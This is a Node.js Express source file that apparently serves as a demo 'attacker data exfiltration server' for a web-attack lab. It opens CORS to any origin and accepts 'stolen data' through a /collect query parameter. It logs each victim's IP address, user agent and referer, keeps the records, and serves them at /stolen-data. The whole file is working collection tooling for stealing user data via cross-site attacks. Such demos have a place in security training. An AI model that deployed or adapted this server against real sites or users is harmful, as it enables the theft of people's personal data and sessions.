const express = require('express');
const app = express();
const PORT = 5001;

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS headers to allow requests from attacker site
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Store stolen data (in memory for demo purposes)
const stolenData = [];

// Endpoint to receive stolen data via GET parameters
app.get('/collect', (req, res) => {
  const timestamp = new Date().toISOString();
  const data = req.query.data;
  
  console.log('\n🚨 STOLEN DATA RECEIVED 🚨');
  console.log('═'.repeat(50));
  console.log(`Time: ${timestamp}`);
  console.log(`Source IP: ${req.ip || req.connection.remoteAddress}`);
  console.log(`User Agent: ${req.get('User-Agent')}`);
  console.log(`Referer: ${req.get('Referer')}`);
  
  if (data) {
    try {
      const parsedData = JSON.parse(decodeURIComponent(data));
      console.log('\n📊 STOLEN USER DATA:');
      console.log(JSON.stringify(parsedData, null, 2));
      
      // Store the stolen data
      stolenData.push({
        timestamp,
        sourceIP: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent'),
        referer: req.get('Referer'),
        data: parsedData
      });
      
      console.log(`\n💾 Total stolen records: ${stolenData.length}`);
      
    } catch (error) {
      console.log('\n❌ ERROR parsing stolen data:');
      console.log(`Raw data: ${data}`);
      console.log(`Error: ${error.message}`);
    }
  } else {
    console.log('\n⚠️  No data parameter received');
  }
  
  console.log('═'.repeat(50));
  
  // Send success response
  res.json({ 
    success: true, 
    message: 'Data received successfully',
    recordCount: stolenData.length 
  });
});

// Endpoint to view all stolen data (for demonstration)
app.get('/stolen-data', (req, res) => {
  res.json({
    totalRecords: stolenData.length,
    data: stolenData
  });
});

// Root endpoint with information
app.get('/', (req, res) => {
  res.json({
    message: 'Attacker Data Exfiltration Server',
    endpoints: {
      '/collect?data={encodedJSON}': 'Receive stolen data via GET parameter',
      '/stolen-data': 'View all collected stolen data',
    },
    totalStolenRecords: stolenData.length
  });
});

app.listen(PORT, () => {
  console.log(`\n🔥 ATTACKER EXFILTRATION SERVER RUNNING 🔥`);
  console.log(`Port: ${PORT}`);
  console.log(`URL: http://localhost:${PORT}`);
  console.log('\nEndpoints:');
  console.log(`  GET /collect?data={data}  - Receive stolen data`);
  console.log(`  GET /stolen-data         - View stolen data`);
  console.log('\nWaiting for stolen data...\n');
});